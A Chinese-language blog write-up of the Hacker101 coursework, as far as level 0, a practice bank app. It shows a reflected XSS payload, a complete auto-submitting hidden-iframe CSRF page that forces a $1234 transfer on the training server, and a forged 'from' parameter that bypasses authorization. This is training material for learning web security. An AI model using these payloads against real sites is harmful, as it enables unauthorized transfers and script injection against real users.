<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="sessions Introduction The Web In Depth XSS and Authorization SQL Injection and Friends Session Fixation Clickjacking File Inclusion Bugs File Upload Bugs Null Termination Bugs Unchecked Redirects Pass">
<meta property="og:type" content="article">
<meta property="og:title" content="Hacker 101 Writeup">
<meta property="og:url" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/index.html">
<meta property="og:site_name" content="Delikely&#39;s Blog">
<meta property="og:description" content="sessions Introduction The Web In Depth XSS and Authorization SQL Injection and Friends Session Fixation Clickjacking File Inclusion Bugs File Upload Bugs Null Termination Bugs Unchecked Redirects Pass">
<meta property="og:locale">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1517843728333.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/error%20xss%20.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/hacker%20101%20coursework1%20source.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/hacker%20101%20xss%201.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/csrf.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1517843759102.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/XSS%20trick.gif">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1517836758756.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1517837065692.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/Forced%20Browsing%202.gif">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1517843790308.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1517841300615.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1517843354347.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1517886629056.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1517887951491.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1517886865871.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1517886498406.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1517887482097.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1517887294804.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1517888597706.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1517891355836.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1517919228408.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1517919354097.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1517919940872.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1517925099885.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1519655383819.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1519805326170.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1519782047229.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1519800662072.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1519805366516.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1519805957215.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1519805239531.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1519913511837.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1519959728275.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1519954198293.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1519957352419.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1519957176364.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1519959691722.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1522763213195.png">
<meta property="og:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1523069644629.png">
<meta property="article:published_time" content="2018-04-15T03:02:30.000Z">
<meta property="article:modified_time" content="2021-06-26T14:03:52.000Z">
<meta property="article:author" content="Delikely">
<meta property="article:tag" content="writeup">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://delikey.github.io/2018/04/14/Hacker101-writeup/1517843728333.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/rice.svg">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/rice.svg" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/rice.png">
          
        
    
    <!-- title -->
    <title>Hacker 101 Writeup</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- rss -->
    
    
<meta name="generator" content="Hexo 5.4.0"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body class="max-width mx-auto px3">
    
      <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/2018/04/11/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/delikely">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2018/05/03/GPON%E5%85%89%E7%BA%A4%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%EF%BC%9A%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-10561%EF%BC%89%E5%92%8C%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-10562%EF%BC%89/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2018/04/14/hello-world/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://delikey.github.io/2018/04/14/Hacker101-writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://delikey.github.io/2018/04/14/Hacker101-writeup/&text=Hacker 101 Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://delikey.github.io/2018/04/14/Hacker101-writeup/&title=Hacker 101 Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://delikey.github.io/2018/04/14/Hacker101-writeup/&is_video=false&description=Hacker 101 Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Hacker 101 Writeup&body=Check out this article: http://delikey.github.io/2018/04/14/Hacker101-writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://delikey.github.io/2018/04/14/Hacker101-writeup/&title=Hacker 101 Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://delikey.github.io/2018/04/14/Hacker101-writeup/&title=Hacker 101 Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://delikey.github.io/2018/04/14/Hacker101-writeup/&title=Hacker 101 Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://delikey.github.io/2018/04/14/Hacker101-writeup/&title=Hacker 101 Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://delikey.github.io/2018/04/14/Hacker101-writeup/&name=Hacker 101 Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sessions"><span class="toc-number">1.</span> <span class="toc-text">sessions</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerabilities"><span class="toc-number">2.</span> <span class="toc-text">Vulnerabilities</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Coursework"><span class="toc-number">3.</span> <span class="toc-text">Coursework</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-0"><span class="toc-number">4.</span> <span class="toc-text">level 0</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81"><span class="toc-number">4.1.</span> <span class="toc-text">前端源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss"><span class="toc-number">4.2.</span> <span class="toc-text">xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF"><span class="toc-number">4.3.</span> <span class="toc-text">CSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87"><span class="toc-number">4.4.</span> <span class="toc-text">权限绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-1"><span class="toc-number">5.</span> <span class="toc-text">level 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS"><span class="toc-number">5.1.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-with-csrf-token"><span class="toc-number">5.2.</span> <span class="toc-text">CSRF with csrf token</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Forced-Browsing"><span class="toc-number">5.3.</span> <span class="toc-text">Forced Browsing</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-2"><span class="toc-number">6.</span> <span class="toc-text">level 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Stored-XSS"><span class="toc-number">6.1.</span> <span class="toc-text">Stored XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reflected-XSS"><span class="toc-number">6.2.</span> <span class="toc-text">Reflected XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unrelated-Bonus"><span class="toc-number">6.3.</span> <span class="toc-text">Unrelated Bonus</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-3"><span class="toc-number">7.</span> <span class="toc-text">level 3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Improper-Authorization"><span class="toc-number">7.1.</span> <span class="toc-text">Improper Authorization</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%80%E5%B7%A7"><span class="toc-number">7.1.1.</span> <span class="toc-text">技巧</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Various-XSS"><span class="toc-number">7.2.</span> <span class="toc-text">Various XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unrelated-Bonuses"><span class="toc-number">7.3.</span> <span class="toc-text">Unrelated Bonuses</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-4"><span class="toc-number">8.</span> <span class="toc-text">level 4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-1"><span class="toc-number">8.1.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-1"><span class="toc-number">8.2.</span> <span class="toc-text">CSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unchecked-Redirects"><span class="toc-number">8.3.</span> <span class="toc-text">Unchecked Redirects</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Systemic-Information-Disclosures"><span class="toc-number">8.4.</span> <span class="toc-text">Systemic Information Disclosures</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Improper-Identity-Handling"><span class="toc-number">8.5.</span> <span class="toc-text">Improper Identity Handling</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-5"><span class="toc-number">9.</span> <span class="toc-text">level 5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Directory-Traversal"><span class="toc-number">9.1.</span> <span class="toc-text">Directory Traversal</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">9.1.1.</span> <span class="toc-text">读取文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reflected-XSS-1"><span class="toc-number">9.2.</span> <span class="toc-text">Reflected XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Command-Injection"><span class="toc-number">9.3.</span> <span class="toc-text">Command Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">9.4.</span> <span class="toc-text">源码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-6"><span class="toc-number">10.</span> <span class="toc-text">level 6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reflected-Stored-XSS"><span class="toc-number">10.1.</span> <span class="toc-text">Reflected&#x2F;Stored XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Reflected-XSS-2"><span class="toc-number">10.1.1.</span> <span class="toc-text">Reflected XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Stored-XSS-1"><span class="toc-number">10.1.2.</span> <span class="toc-text">Stored XSS</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Injection"><span class="toc-number">10.2.</span> <span class="toc-text">SQL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-2"><span class="toc-number">10.3.</span> <span class="toc-text">CSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-1"><span class="toc-number">10.4.</span> <span class="toc-text">源码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-7"><span class="toc-number">11.</span> <span class="toc-text">level 7</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Injection-1"><span class="toc-number">11.1.</span> <span class="toc-text">SQL Injection</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-8"><span class="toc-number">12.</span> <span class="toc-text">level 8</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-2"><span class="toc-number">12.1.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Directory-Traversal-1"><span class="toc-number">12.2.</span> <span class="toc-text">Directory Traversal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Injection-2"><span class="toc-number">12.3.</span> <span class="toc-text">SQL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Code-Execution"><span class="toc-number">12.4.</span> <span class="toc-text">Code Execution</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-2"><span class="toc-number">12.5.</span> <span class="toc-text">源码</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Hacker 101 Writeup
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Delikely's Blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2018-04-15T03:02:30.000Z" itemprop="datePublished">2018-04-15</time>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/writeup/" rel="tag">writeup</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="sessions"><a href="#sessions" class="headerlink" title="sessions"></a>sessions</h2><ul>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/sessions/introduction">Introduction</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/sessions/web_in_depth">The Web In Depth</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/sessions/xss">XSS and Authorization</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/sessions/sqli">SQL Injection and Friends</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/sessions/session_fixation">Session Fixation</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/sessions/clickjacking">Clickjacking</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/sessions/file_inclusion">File Inclusion Bugs</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/sessions/file_uploads">File Upload Bugs</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/sessions/null_termination">Null Termination Bugs</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/sessions/unchecked_redirects">Unchecked Redirects</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/sessions/password_storage">Password Storage</a></li>
<li>Crypto series<ul>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/sessions/crypto_crash_course">Crypto Crash Course</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/sessions/crypto_attacks">Crypto Attacks</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/sessions/crypto_wrap-up">Crypto Wrap-Up</a></li>
</ul>
</li>
</ul>
<h2 id="Vulnerabilities"><a href="#Vulnerabilities" class="headerlink" title="Vulnerabilities"></a>Vulnerabilities</h2><ul>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/vulnerabilities/clickjacking">Clickjacking</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/vulnerabilities/command_injection">Command Injection</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/vulnerabilities/csrf">Cross-Site Request Forgery (CSRF)</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/vulnerabilities/directory_traversal">Directory Traversal</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/vulnerabilities/file_inclusion">Local/Remote File Inclusion</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/vulnerabilities/improper_authorization">Improper Authorization</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/vulnerabilities/insecure_password_storage">Insecure Password Storage</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/vulnerabilities/null_termination">Improper Handling of Null Termination</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/vulnerabilities/padding_oracle">Padding Oracle</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/vulnerabilities/reflected_xss">Reflected Cross-Site Scripting (XSS)</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/vulnerabilities/session_fixation">Session Fixation</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/vulnerabilities/sqli">SQL Injection</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/vulnerabilities/stored_xss">Stored Cross-Site Scripting (XSS)</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/vulnerabilities/stream_reuse">Stream Cipher Key Reuse</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/vulnerabilities/unchecked_redirect">Unchecked Redirect</a></li>
</ul>
<h2 id="Coursework"><a href="#Coursework" class="headerlink" title="Coursework"></a>Coursework</h2><ul>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/coursework/level0">Level 0: Breakerbank</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/coursework/level1">Level 1: Breakbook</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/coursework/level2">Level 2: Breaker Profile</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/coursework/level3">Level 3: Breaker CMS</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/coursework/level4">Level 4: Breaker News</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/coursework/level5">Level 5: Document Repository</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/coursework/level6">Level 6: Student Center</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/coursework/level7">Level 7: Guardian</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hacker101.com/coursework/level8">Level 8: Document Exchange</a></li>
</ul>
<h2 id="level-0"><a href="#level-0" class="headerlink" title="level 0"></a>level 0</h2><p><img src="./1517843728333.png" alt="1517843728333"></p>
<p>刚试了第一题的XSS，被chrome拦截了。看来得换firefox做!</p>
<p><img src="./error xss .png" alt="hacker 101 coursework1 source"></p>
<h3 id="前端源码"><a href="#前端源码" class="headerlink" title="前端源码"></a>前端源码</h3><p><img src="./hacker 101 coursework1 source.png" alt="hacker 101 coursework1 source"></p>
<h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1000&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;img scr&#x3D;&quot;none&quot; border&#x3D;&quot;0px</span><br></pre></td></tr></table></figure>
<p><img src="./hacker 101 xss 1.png" alt="hacker 101 xss 1"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Destination account: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;input&quot;</span> <span class="attr">name</span>=<span class="string">&quot;to&quot;</span> <span class="attr">value</span>=<span class="string">&quot;12121<span class="symbol">&amp;#34;</span><span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(1)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>img scr=<span class="symbol">&amp;#34;</span>none<span class="symbol">&amp;#34;</span> border=<span class="symbol">&amp;#34;</span>0px&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Amount: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;input&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1000&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">scr</span>=<span class="string">&quot;none&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0px&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Destination account 对敏感的输入做了转码，而Amount没有，所以导致了反射型XSS的出现。</p>
<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>post型的CSRF，需要放在iframe中才能绕过同源策略的限制。提交转账请求的时候没有任何校验请求的发送者是真实人发送的还是有代码触发的。一般的防御措施有：</p>
<ul>
<li>验证码（缺陷不可能任何请求都添加验证码）</li>
<li>Referer（可以伪造）</li>
<li>Token验证（广泛采用的方法）</li>
</ul>
<p>自己编写利用脚本利用CSRF，内容如下。参考 <a target="_blank" rel="noopener" href="https://www.hacker101.com/vulnerabilities/csrf">https://www.hacker101.com/vulnerabilities/csrf</a> 给的利用代码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Test CSRF <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf-frame&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&#x27;POST&#x27;</span> <span class="attr">action</span>=<span class="string">&#x27;https://levels-a.hacker101.com/levels/0/&#x27;</span> <span class="attr">target</span>=<span class="string">&quot;csrf-frame&quot;</span> <span class="attr">id</span>=<span class="string">&quot;csrf-form&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span>&gt;</span></span><br><span class="line">true<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;hidden&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;to&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;1811&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;hidden&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;amount&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;1234&#x27;</span>&gt;</span></span><br><span class="line">true<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;submit&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;Transfer&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Auto submit the form when page loads --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">&quot;csrf-form&quot;</span>).submit()</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我当前登录的账号为1711，只要访问此页面就会自动给1811转账$1234。</p>
<p>在加载iframe中，提交post请求时使用的cookie是已登录用户1711的cookie，故服务器会以为是1711发起的转账请求，并完成了转账操作。</p>
<p><img src="./csrf.png" alt="1517234629034"></p>
<h3 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h3><p>表单中添加from，任意指定转账的发起方。测试时，直接在POST的参数中添加from参数。</p>
